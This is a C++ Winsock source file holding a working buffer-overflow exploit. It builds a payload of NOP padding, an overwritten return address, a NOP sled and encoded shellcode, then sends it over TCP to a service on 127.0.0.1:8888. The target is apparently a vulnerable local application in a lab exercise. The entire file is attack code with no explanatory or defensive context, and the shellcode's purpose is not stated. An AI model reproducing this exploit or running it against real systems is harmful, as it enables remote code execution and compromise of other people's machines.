#include <iostream>
#include <string>
#include <winsock2.h>
#include <typeinfo>

#pragma comment(lib, "ws2_32.lib")


SOCKET connect_to_address(const char* address, const int port){

    WSADATA wsa;
    SOCKET s;

    struct sockaddr_in server;

    std::cout << "Initialising socket...\n";

    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0){
        printf("Failed with error code: %d\n", WSAGetLastError());
        return 1;
    }

    std::cout << "WSA Startup succeeded...\n";

    s= socket(AF_INET, SOCK_STREAM, 0);
    
    if(s == INVALID_SOCKET){
        printf("[-] Could not create socket %d\n", WSAGetLastError());
        return 1;
    }

    std::cout << "[+] Socket created...\n";
    
    server.sin_addr.s_addr= inet_addr(address);
    server.sin_family= AF_INET;
    server.sin_port = htons(port);

	if( connect(s, (struct sockaddr *)&server, sizeof(server)) < 0){
		std::cerr << "[-] Could not connect to the server!\n";
		return 1;
	}

    return s;

}

std::string form_payload(){

    struct payload{
        std::string padding,
                    eip,
                    nops,
                    shellCode,
                    overrun ;
    }cloudPayload;


    cloudPayload.padding= std::string(1052, '\x90');
    cloudPayload.eip = "\xB5\x42\xA8\x68";
    cloudPayload.nops = std::string(30, '\x90');
    cloudPayload.shellCode = 
		"\xb8\x4d\xb3\x98\x0f\xda\xc6\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
		"\x31\x31\x45\x13\x83\xc5\x04\x03\x45\x42\x51\x6d\xf3\xb4\x17"
		"\x8e\x0c\x44\x78\x06\xe9\x75\xb8\x7c\x79\x25\x08\xf6\x2f\xc9"
		"\xe3\x5a\xc4\x5a\x81\x72\xeb\xeb\x2c\xa5\xc2\xec\x1d\x95\x45"
		"\x6e\x5c\xca\xa5\x4f\xaf\x1f\xa7\x88\xd2\xd2\xf5\x41\x98\x41"
		"\xea\xe6\xd4\x59\x81\xb4\xf9\xd9\x76\x0c\xfb\xc8\x28\x07\xa2"
		"\xca\xcb\xc4\xde\x42\xd4\x09\xda\x1d\x6f\xf9\x90\x9f\xb9\x30"
		"\x58\x33\x84\xfd\xab\x4d\xc0\x39\x54\x38\x38\x3a\xe9\x3b\xff"
		"\x41\x35\xc9\xe4\xe1\xbe\x69\xc1\x10\x12\xef\x82\x1e\xdf\x7b"
		"\xcc\x02\xde\xa8\x66\x3e\x6b\x4f\xa9\xb7\x2f\x74\x6d\x9c\xf4"
		"\x15\x34\x78\x5a\x29\x26\x23\x03\x8f\x2c\xc9\x50\xa2\x6e\x87"
		"\xa7\x30\x15\xe5\xa8\x4a\x16\x59\xc1\x7b\x9d\x36\x96\x83\x74"
		"\x73\x68\xce\xd5\xd5\xe1\x97\x8f\x64\x6c\x28\x7a\xaa\x89\xab"
		"\x8f\x52\x6e\xb3\xe5\x57\x2a\x73\x15\x25\x23\x16\x19\x9a\x44"
		"\x33\x7a\x7d\xd7\xdf\x53\x18\x5f\x45\xac";
    
    cloudPayload.overrun= std::string(194, 'C');

    std::string finalPayload= "";

    finalPayload= cloudPayload.padding + cloudPayload.eip + cloudPayload.nops + cloudPayload
    .shellCode+ cloudPayload.overrun;

    return finalPayload;
}


void send_payload(std::string payload, SOCKET s){

	if(send(s, payload.c_str(), payload.length(), 0) < 0){

	    std::cout << "[-] Send failed!!\n";
	    exit(1) ;
	}

    std::cout << "[+] Payload sent...\n";
    exit(0) ;
}

int main(int argc, char* argv[]){

    const char* address= "127.0.0.1";
    const int port= 8888;

   SOCKET cloudSocket= connect_to_address(address, port);
   std::string payload= form_payload();

   send_payload(payload, cloudSocket);

    return 0;
}
